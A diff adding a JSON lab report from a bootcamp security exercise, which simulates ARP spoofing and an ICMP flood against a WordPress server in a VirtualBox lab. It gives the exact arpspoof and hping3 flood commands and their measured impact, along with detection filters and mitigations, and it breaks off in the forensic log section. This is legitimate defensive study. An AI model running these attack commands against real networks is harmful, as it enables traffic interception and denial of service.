@@ -1,0 +1,137 @@
+{
+  "project": "WordPress Security: Spoofing & DoS Attack Simulation",
+  "author": "Joel Mutua",
+  "course": "4Geeks Bootcamp",
+  "date": "2023-11-15",
+  "environment": {
+    "test_environment": {
+      "hypervisor": "Oracle VirtualBox 7.0.10",
+      "network_configuration": {
+        "debian_server": {
+          "ip": "192.168.1.10/24",
+          "gateway": "192.168.1.1",
+          "services": ["Apache 2.4.56", "WordPress 6.3.1", "MySQL 15.1"]
+        },
+        "kali_attacker": {
+          "ip": "192.168.1.11/24",
+          "gateway": "192.168.1.1",
+          "tools": ["arpspoof (dsniff 2.4)", "hping3 3.0.0", "Wireshark 4.0.6"]
+        }
+      }
+    }
+  },
+  "attack_simulations": {
+    "arp_spoofing": {
+      "execution": {
+        "command": "sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1",
+        "duration": "300 seconds",
+        "packet_rate": "42 packets/second"
+      },
+      "observables": {
+        "debian_arp_table_change": {
+          "before": "192.168.1.1 at 52:54:00:12:35:00 [ether]",
+          "after": "192.168.1.1 at 00:0c:29:ab:cd:ef [ether]"
+        },
+        "wireshark_findings": {
+          "duplicate_mac_addresses": true,
+          "arp_opcode_analysis": "Excessive ARP REPLY packets (opcode 2)"
+        }
+      },
+      "impact": {
+        "website_accessibility": "Degraded (400-800ms latency)",
+        "mysql_connections": "12% packet loss"
+      }
+    },
+    "icmp_flood": {
+      "execution": {
+        "command": "sudo hping3 -1 192.168.1.10 -I eth0 --flood",
+        "duration": "180 seconds",
+        "packet_size": "84 bytes",
+        "packet_rate": "1,250 pps"
+      },
+      "server_metrics": {
+        "cpu_utilization": {
+          "pre_attack": "18%",
+          "during_attack": "93%"
+        },
+        "memory_usage": {
+          "pre_attack": "1.4GB/3.9GB",
+          "during_attack": "3.1GB/3.9GB"
+        },
+        "apache_workers": {
+          "normal": "8 active children",
+          "during_attack": "MaxClients reached (25)"
+        }
+      },
+      "network_impact": {
+        "bandwidth_consumption": "78Mbps",
+        "tcp_retransmits": "22% increase"
+      }
+    }
+  },
+  "detection_methods": {
+    "arp_spoofing": [
+      {
+        "technique": "ARP table monitoring",
+        "command": "arp -v"
+      },
+      {
+        "technique": "Wireshark filters",
+        "filters": ["arp.duplicate-address-frame", "arp.opcode == 2"]
+      }
+    ],
+    "icmp_flood": [
+      {
+        "technique": "ICMP rate limiting",
+        "command": "sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT"
+      },
+      {
+        "technique": "Traffic analysis",
+        "tools": ["iftop", "nethogs"]
+      }
+    ]
+  },
+  "mitigation_strategies": {
+    "network_layer": [
+      {
+        "solution": "Port Security",
+        "implementation": "switchport port-security mac-address sticky",
+        "effectiveness": "Prevents MAC flooding"
+      },
+      {
+        "solution": "DAI (Dynamic ARP Inspection)",
+        "implementation": "ip arp inspection vlan 1",
+        "effectiveness": "Blocks spoofed ARP packets"
+      }
+    ],
+    "system_hardening": [
+      {
+        "solution": "ICMP Rate Limiting",
+        "implementation": "iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT",
+        "effectiveness": "90% attack reduction"
+      },
+      {
+        "solution": "SYN Cookies",
+        "implementation": "sysctl -w net.ipv4.tcp_syncookies=1",
+        "effectiveness": "Prevents SYN flood exhaustion"
+      }
+    ],
+    "wordpress_specific": [
+      {
+        "solution": "Web Application Firewall",
+        "recommendation": "Wordfence or Cloudflare",
+        "protection": "SQLi/XSS/DoS filtering"
+      },
+      {
+        "solution": "Resource Limiting",
+        "implementation": "Apache: MaxClients 50",
+        "rationale": "Prevents worker exhaustion"
+      }
+    ]
+  },
+  "forensic_artifacts": {
+    "arp_spoofing": [
+      {
+        "log_source": "/var/log/syslog",
+        "entries": [
+          "kernel: [UFW BLOCK]
